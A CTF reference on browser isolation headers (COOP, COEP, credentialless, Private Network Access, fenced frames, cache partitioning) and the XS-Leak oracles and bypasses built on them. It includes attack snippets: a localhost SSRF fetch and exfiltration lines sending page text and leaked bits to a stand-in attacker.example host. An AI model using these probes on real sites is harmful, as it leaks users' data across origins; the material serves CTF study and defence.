# CTF Web - Cross-Origin Isolation & Browser Isolation Primitives (COOP / COEP / Credentialless / Fenced Frames / Cache Partitioning)

The 2023-2025 XS-Leak research line (XSinator, LeakProbe, AutoLeak) attacks the primitives modern browsers ship to isolate browsing contexts: COOP/COEP/CORP headers, credentialless requests, Private Network Access, fenced frames, and the double-keyed HTTP cache. In CTFs these show up two ways: the **defense** side (a challenge bot runs a hardened Chrome, so classic opener/XSS-read chains fail) and the **oracle** side (each isolation primitive is itself an observable — blocked load, severed opener, split cache partition — that leaks a cross-origin bit when direct XSS is impossible). This file covers the primitive semantics, the leak channels they create, and the bypass directions; for plain XSS/admin-bot flows see [client-side.md](client-side.md), for CSP/strict-no-JS exfiltration see [client-side-advanced.md](client-side-advanced.md). Browser-behavior claims are marked per-engine with "as of 2024-2025" and listed in [Uncertainties to Re-Verify](#uncertainties-to-re-verify) — always confirm against the challenge's actual browser (bot version, launch flags).

## Table of Contents
- [COOP (Cross-Origin-Opener-Policy)](#coop-cross-origin-opener-policy)
- [COEP (Cross-Origin-Embedder-Policy)](#coep-cross-origin-embedder-policy)
- [Credentialless Requests and PNA (Private Network Access)](#credentialless-requests-and-pna-private-network-access)
- [Fenced Frames](#fenced-frames)
- [Cache Partitioning (Double-Keyed Cache)](#cache-partitioning-double-keyed-cache)
- [XS-Leak Tactics](#xs-leak-tactics)
- [Browser Version Matrix (as of 2024-2025)](#browser-version-matrix-as-of-2024-2025)
- [Uncertainties to Re-Verify](#uncertainties-to-re-verify)

---

## COOP (Cross-Origin-Opener-Policy)

**Pattern:** a top-level response header `Cross-Origin-Opener-Policy: unsafe-none | same-origin-allow-popups | same-origin`. When a popup's response carries `same-origin` (or `same-origin-allow-popups`), the popup is placed in a **new browsing context group (BCG)**: the opener/popup pair loses same-origin window access and `window.opener` becomes `null` from the isolated side. Historical values: `restrict-properties` (renamed to `same-origin-allow-popups`, Chrome 79, 2019) and `same-origin-plus-COEP` (deprecated ≈Chrome 95-96, 2021-2022, removed from the spec — verify exact drop).

**Detection:** response headers of the target pages; from your own page, `window.open(target)` and check `win.opener`/`win.closed`; apps that `window.open()` for OAuth/print/sharing flows are the usual COOP deployers.

**Exploitation — COOP as oracle, not just a defense:**
- COOP does **not** remove the cross-origin-accessible WindowProxy properties: `window.closed`, `window.length`, `focus()`, `blur()` and `postMessage()` still work across BCGs. **Frame counting via `window.length` survives COOP** — a logged-in page rendering 3 iframes vs a logged-out page rendering 0 leaks login state (XSinator "frame counting").
- `postMessage` with `targetOrigin: '*'` is unaffected by COOP — any message-echoing endpoint stays a cross-origin read channel.
- The header value is an isolation fingerprint: `same-origin` vs `same-origin-allow-popups` vs absent tells you whether opener attacks, `window.name` chains, or cross-window DOM reads are viable.

```javascript
// frame-count oracle against a COOP-isolated target
let w = window.open("https://target/", "t1");
await new Promise(r => setTimeout(r, 1200));       // let it load (no onload access)
let frames = w.length;                             // cross-origin/cross-BCG readable
// frames > 0 => page renders subframes (often auth-dependent)
```

**Bypass directions:**
- **Double-hop popup:** a COOP page that itself `window.open()`s an attacker URL (no COOP on that response) puts the attacker window in the *same* BCG as the COOP page — the attacker window keeps a live `window.opener` back to the isolated page. From there: read `opener.name`, `postMessage` to it, or navigate it via cross-origin `opener.location = ...` (location *write* is allowed cross-origin). The first-hop window (from the attacker's page) is the severed one; the second hop re-enters the victim's BCG.
- **Name-based window reuse:** `window.open(url, 'victim-name')` reuses an existing window with that name and navigates it. Re-navigating a named window that already lives in your BCG can pull the victim page into a window you still proxy. Several concrete COOP/`window.name` bypass bugs were patched in Chrome 2021-2023 — treat as **mostly mitigated on current Chrome, re-validate empirically**; the name-reuse trick itself remains a first-class primitive against *non-COOP* targets.
- **Browsing-context confusion:** apps that use `rel="noopener"` or `window.open(url, 'noopener')` are indistinguishable from COOP isolation at the attacker page — probe `window.opener` to tell "noopener" from "COOP same-origin" (matters for chaining).
- **Defense-bypass mindset:** if the *victim* page is COOP-isolated, shift from opener-read primitives to the behavioral oracles in [COEP](#coep-cross-origin-embedder-policy) / [Cache Partitioning](#cache-partitioning-double-keyed-cache).

**Browser notes:** COOP: Chrome/Edge 82+ (2020), Firefox 79+ (2020-08), Safari 15.4+ (2022-03; Safari's `same-origin-allow-popups` semantics reportedly differ — verify). Modern Chrome/Edge also send `Cross-Origin-Opener-Policy` on some internal flows; an absent header means `unsafe-none`.

---

## COEP (Cross-Origin-Embedder-Policy)

**Pattern:** `Cross-Origin-Embedder-Policy: require-corp | credentialless | unsafe-none`. With `require-corp`, every cross-origin **no-cors** subresource (`<img>`, `<script>`, `<link>`, `<iframe>`, no-cors `fetch`) must be allowed by a `Cross-Origin-Resource-Policy` header on the *resource response* (`cross-origin`, or `same-site`/`same-origin` matching the embedder), otherwise the browser blocks the resource and logs a CORP error. `credentialless` is covered in the next section.

**Detection:** the header on target pages; CORP errors in the bot page's console; embedded resources that fail to fire `load`; a target that serves `Cross-Origin-Resource-Policy` on some paths but not others.

**Exploitation — CORP as existence oracle:** you control the embedding document, so you can set `COEP: require-corp` on *your* page and probe the victim:

```javascript
// load target/<path> as no-cors; observe load-vs-blocked (existence + CORP policy oracle)
const img = new Image();
img.src = "https://victim/" + path;          // no-cors embed
img.onload = beacon(1);                       // loads: exists AND carries CORP: cross-origin
img.onerror = beacon(0);                      // blocked or absent — disambiguate with a known-404 probe
```

- Sensitive endpoints often carry CORP (CDN/API hardening); static files often do not → the onload/onerror split maps the **server's file layout + header policy** without any same-origin read.
- If the *victim page itself* runs `COEP: require-corp`, it blocks its own third-party widgets that lack CORP → observable in the victim's **rendered frame count / DOM** (an ad or auth widget disappears when logged in/out) — combine with the frame-count oracle above.
- **credentialless mode** (`COEP: credentialless`, Chrome-only): cross-origin no-cors requests are sent **without credentials** (no cookies, no HTTP auth, no client certs) and are *not* CORP-blocked. Embedding `victim/private` from an attacker page with `credentialless` gives load-vs-error == **login-state oracle**: the resource loads only when it does not require auth.

**Cache side channel:** credentialless requests still flow through the double-keyed HTTP cache, so a credentialless fetch of `victim/private` reflects the cached/uncached state of credentialless entries — cross-check timing against a credentialed top-level load to infer the victim origin's cache activity (the W3C fetch thread "COEP:credentialless and the HTTP cache", 2023, documents the cache-interaction hazards: credentialless requests can hit responses cached without `Vary: Cookie` differentiation). Exact cache-key behavior differs by browser — verify empirically before building a byte-extraction loop on it.

**Browser notes:** `require-corp`: Chrome 87+ (2020-11), Firefox 79+, Safari 15.4+. **`credentialless`: Chrome/Edge only, shipped Chrome 96 (2021-11); Firefox and WebKit do not implement it as of 2024-2025** — a challenge bot running Firefox/WebKit ignores it entirely.

---

## Credentialless Requests and PNA (Private Network Access)

**Pattern:** two related but distinct mechanisms. (a) **Credentialless requests** — `fetch(url, {credentials:'omit'})`, `crossorigin` attributes, and COEP-credentialless embeds: requests that go out without cookies/auth yet still resolve (unlike no-cors embeds that error). (b) **PNA (Private Network Access)** — Chrome restricts requests from public web pages to private-network targets (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `::1`, `.local` names).

**PNA mechanics:** public→private requests log a DevTools warning since ≈Chrome 123 (2024-03); blocking was planned for Chrome 130 (2024-10) but the rollout was **paused ("Private Network Access on hold", Chrome blog, January 2025)** in favor of a "Local Network Access" permission-prompt redesign. As of 2025, requests to localhost/private IPs from the open web **still succeed** by default. When PNA enforcement is active (flag), a `fetch(..., {mode:'cors'})` to a private target triggers a preflight carrying `Access-Control-Request-Private-Network: true`; the server must answer `Access-Control-Allow-Private-Network: true` or the request is blocked — simple no-cors embeds get the same preflight under enforcement.

**CTF angle — browser SSRF:** the classic bot-based SSRF — attacker page fetches `http://127.0.0.1:<port>/admin` from the victim's browser, riding the victim's local-network position and cookies — **still works on default 2024-2025 Chrome because PNA is on hold**. Always try it first:

```javascript
// browser SSRF probe (PNA on hold => works on stock Chrome 2024-2025)
fetch("http://127.0.0.1:5000/admin", {credentials: "include"})
  .then(r => r.text()).then(beacon)                       // status/body readable? CORS-dependent
fetch("http://127.0.0.1:5000/admin")                      // no-cors: existence via then/catch split
```

- If local fetches fail oddly, check the bot's Chrome version and launch flags (bots often pin headless flags that toggle PNA/`--disable-features`); the `Access-Control-Request-Private-Network` header in a challenge's request logs is the smoking gun that PNA preflights are enforced.
- **Credentialless as auth splitter:** compare `credentials:'omit'` vs `'include'` on the same URL — 401/blocked in one mode and not the other tells you "resource requires auth" vs "public", and surfaces `Vary: Cookie` cache splits.

**Browser notes:** PNA is Chrome-only; on hold as of 2025 (re-verify per version, blocking may resume). Firefox: PNA exists behind a flag (default off as of 2024 — flag name varies, verify). Safari: no PNA. `fetch` credentialless options work in all engines; their *interaction* with COEP/crossOriginIsolated contexts differs.

---

## Fenced Frames

**Pattern:** `<fencedframe>` (Chrome 114+, 2023-06) is the Privacy Sandbox's opaque frame for Protected Audience (FLEDGE) ads and Shared Storage output. Key behaviors: the embedding page **cannot script or read the fenced frame at all** (no same-origin access even for same-site content); the fenced frame sees itself as top-level (`window.top === window`); navigation can use a `FencedFrameConfig` that carries Shared Storage context (`setSharedStorageContext`); `window.fence.reportEvent({destinationURL})` / `registerAdBeacon` fire network beacons; some configs enforce **opaque network access** (no cookies, no referrer — detail varies by FencedFrameConfig, verify).

**Detection:** a `<fencedframe>` tag / `fencedframe` element in the page; `window.fence` or `FencedFrameConfig` in JS; `navigator.runAdAuction()` / Protected Audience code; challenge UI described as "private sandbox", "ads", or "shared storage".

**Exploitation / exfil channels:**
- XSS *inside* a fenced frame **cannot read the parent** (unlike iframe XSS) — treat the frame as its own origin sandbox; exfil its secrets outward via beaconing: `window.fence.reportEvent({destinationURL: "https://attacker/collect?...", eventType: ..., eventData: ...})` or `registerAdBeacon`, which reach attacker-controlled URLs directly (K-anonymity applies to ad reports, not necessarily to arbitrary beacons — verify).
- The embedding page **cannot observe** fenced-frame network activity through DOM events (`onload` on a fenced frame yields nothing readable) — evidence comes from the fenced frame's own beacons or from net logs (`chrome://net-export`, DevTools) if you control the browser (e.g., headless bot instrumentation).
- If the flag is displayed *inside* a fenced frame, do not attempt DOM reads — hunt for a Shared Storage write/read pair (your script writes via `sharedStorage.set()`, a fenced frame reads it and beacons) or a misconfigured `reportEvent` destination; `setSharedStorageContext` leaks caller context into the frame's first navigation.

```javascript
// fenced-frame -> attacker beacon (runs inside the fenced frame)
window.fence.reportEvent({
  eventType: "leak", eventData: document.body.innerText,
  destinationURL: "https://attacker.example/collect"
});
```

**Browser notes:** fenced frames are Chrome-only (114+, 2023-06); Firefox/Safari: not implemented as of 2024-2025. Since Chrome 130ish, fenced frames can also be created via `document.createElement('fencedframe')` with a `config` attribute. Cookie/credential behavior inside fenced frames depends on the FencedFrameConfig ("opaque" vs "non-opaque" network modes) — always test the challenge's actual configuration.

---

## Cache Partitioning (Double-Keyed Cache)

**Pattern:** the HTTP cache is **double-keyed** by (top-level site, frame site): Chrome since 86 (2020-10, on by default by ≈M97/2022), Firefox partitioned by default since 85 (2021-01), Safari keyed third-party cache by top-level site since the ITP era (≈2013).

**Impact on cache poisoning:** classic *cross-site* web-cache poisoning dies in the **browser cache** — the attacker's top-level origin is part of the key, so a poisoned response cached under the attacker's top-level never serves to victims browsing their own site. The catch for CTF: **server-side caches (CDN, reverse proxy) are not partitioned**, so classic cache poisoning / cache deception still works when the cache lives at the server (this is where the 2023-2024 "Web Cache Deception" research moved the action); and *within-partition* poisoning (same top-level site) is unaffected.

**Bypass / oracle angles:**
- **Partition probe (cache-timing XS-leak):** embed `victim/resource` in an iframe under *your* top-level → load time reflects the `(attacker.top, victim.site)` partition; then compare with `(victim.top, victim.site)` (navigate to the victim page or have the bot visit it) → **infer what the victim recently cached** → login/visit detection ("has the victim opened their dashboard today?") without any same-origin read.

```javascript
// warm/cold split of a cross-origin resource in YOUR partition (timing oracle)
let t0 = performance.now();
let img = new Image(); img.src = "https://victim/private/asset";
img.onload = () => beacon(performance.now() - t0 > 200 ? "cold" : "warm");
```

- **Redirect chains:** a redirect response is cached under the *requesting* partition's key while the final hop lands under another — chained redirects can move a resource across partition boundaries or make a poisoned redirect serve under a victim key. Several cross-partition redirect bugs were fixed 2021-2023; re-test per Chrome version (this is the most promising *bypass* direction for cross-site poisoning in a partitioned world).
- **Service worker caches** are origin-keyed rather than double-keyed by top-level site (as of 2023-2024; storage partitioning is being extended to SW storage — verify): a SW on the victim origin can serve responses into any embedding top-level, defeating partition-based isolation and enabling SW-scoped probes.
- **Storage partitioning side effect:** Chrome 115+ (2023-07) partitions third-party storage (localStorage, IndexedDB, cookies) alongside third-party-cookie deprecation — old "does origin X have localStorage" probes now see only the partitioned view; storage-existence XS-leaks die for third-party contexts but survive in top-level navigation flows (e.g., `window.open` + storage access then reading back via name reuse).

**Browser notes:** Chrome/Edge: partitioned by default since ≈M97 (2022); Firefox: since 85; Safari: since ITP. None of these are site-controllable — the partition behavior itself is the oracle.

---

## XS-Leak Tactics

**Goal:** leak one bit at a time across origins when no XSS is possible — login state, resource existence, content-type, frame count, cache state — then reassemble (boolean oracle → byte oracle with charset splitting). The sections above are the modern primitive menu; this section is the workflow.

**Primitive menu:**
- **Frame counting:** `<iframe>` + `window.length` / `win.length` (cross-origin and cross-BCG readable) — page renders N vs 0 frames when authed. Most reliable COOP-resistant oracle.
- **Embed oracles:** `<img>/<script>/<iframe>` `onload`/`onerror`; no-cors `fetch` resolve/reject. `fetch` error-type split is powerful: `TypeError` with `type: 'cors'` vs `type: 'error'` distinguishes "server exists but no CORS headers" from "no server/path" (DNS/IP reachability oracle).
- **Timing:** `performance.now()` around fetch/embed — cache warm/cold (partitioned), server-side sleeps, parser-blocking resource order; "race" loops (repeat N probes, median) for stable byte extraction.
- **`window.name` persistence:** a window's name survives cross-origin navigations and is readable by the *navigating* party — carry a value into the victim origin and read it back after navigation (a.k.a. "window-name magic").
- **`postMessage` echo:** find a message-handling endpoint that reflects/responds; binary-search a secret by crafted messages (works through COOP).
- **CSS exfiltration:** if you can inject style into the victim page without JS (CSP-strict, XSS-less), `@import`/font/`background` load-timing and `:visited`-adjacent tricks leak per-character — cross-check [client-side-advanced.md](client-side-advanced.md).

**Bot workflow (CTF):** submit URL → bot (admin-cookie Chrome) loads your page → probes against `http://localhost:<port>/...` or the admin app → beacon bits out:

```javascript
// beacon: 1x1 GIF with payload in the query is the lowest-risk channel
new Image().src = "https://attacker.example/b?b=" + bit + "&i=" + index;
// or fetch with credentials:'include' when the collector needs cookies;
// remember 3P cookie partitioning: a beacon into an unpartitioned first-party
// context is more reliable than a third-party iframe fetch
```

**Defense-encounter → bypass mapping:** COOP/COEP present → frame-counting, postMessage, credentialless-embed oracles, and cache partition probes (sections above); PNA enforced → localhost fetch breaks, fall back to embed-oracles/timing against local services; fully partitioned/storage-isolated → focus on **behavioral differences** (rendered frames, resource loads, timing) instead of direct reads; strict CSP + no-JS → CSS-exfil route via [client-side-advanced.md](client-side-advanced.md).

**References:** XSinator (2022/2023, xsinator.com — frame-count/CORP/timing taxonomy), LeakProbe (2023), AutoLeak (ACM CCS 2023), "SameSite XS-Leaks" (2025, Zenodo record 21285165 — cross-origin capability-escalation chains), PortSwigger Web Security Academy "XS leaks". New primitives appear yearly — check current-year research before assuming a channel is closed.

---

## Browser Version Matrix (as of 2024-2025)

| Primitive | Chrome / Edge | Firefox | Safari | CTF note |
|---|---|---|---|---|
| COOP `same-origin` | 82+ (2020) | 79+ (2020) | 15.4+ (2022, semantics differ — verify) | header fingerprint + frame-count oracle survive |
| COOP `same-origin-allow-popups` | 79+ (renamed from `restrict-properties`) | 79+ | partial / unsupported — verify | vs `same-origin`: tells you whether opener reuse chains work |
| COOP `same-origin-plus-COEP` | removed ≈M95-96 (2021-22) | never | never | legacy challenges only |
| COEP `require-corp` | 87+ (2020) | 79+ | 15.4+ | CORP onload/onerror = existence oracle |
| COEP `credentialless` | 96+ (2021) | not implemented | not implemented | login-state oracle; Chrome-only |
| PNA preflight / block | warn M123+, block paused (2025, "on hold") | behind flag (verify) | no | browser SSRF usually still works |
| Fenced frames | 114+ (2023-06) | no | no | beacon-based exfil; parent unreadable |
| Double-keyed HTTP cache | 86+, default ≈M97 (2022) | 85+ (2021) | keyed since ITP era | partition probe = cross-site cache oracle |
| 3P storage partitioning | 115+ (2023-07) | Total Cookie Protection (2021+) | ITP (default) | kills old cross-origin storage probes |
| CORP header | 73+ (2019) | 74+ | 13+ | older than COEP; useful alone |

---

## Uncertainties to Re-Verify

- Exact Chrome releases where specific COOP/`window.name`-reuse bypass bugs were patched (2021-2023 window; treat modern Chrome as "mostly mitigated", re-validate on the bot's version).
- Safari's real semantics for `Cross-Origin-Opener-Policy: same-origin-allow-popups` (reports of treating it as `same-origin` — confirm on current WebKit).
- PNA status changes: rollout paused January 2025; blocking may resume or become a permission prompt ("Local Network Access") — check the bot's exact Chrome build and flags.
- Firefox PNA flag name and default (2024-2025 state varies by release channel).
- Fenced-frame cookie/credential and "opaque network" behavior per FencedFrameConfig mode; `reportEvent` K-anonymity scope.
- Whether Service Worker / CacheStorage storage has been partitioned by top-level site on current Chrome (extension of storage partitioning is ongoing).
- Exact cache-key interaction of `COEP: credentialless` requests with `Vary: Cookie` responses (differs by engine).
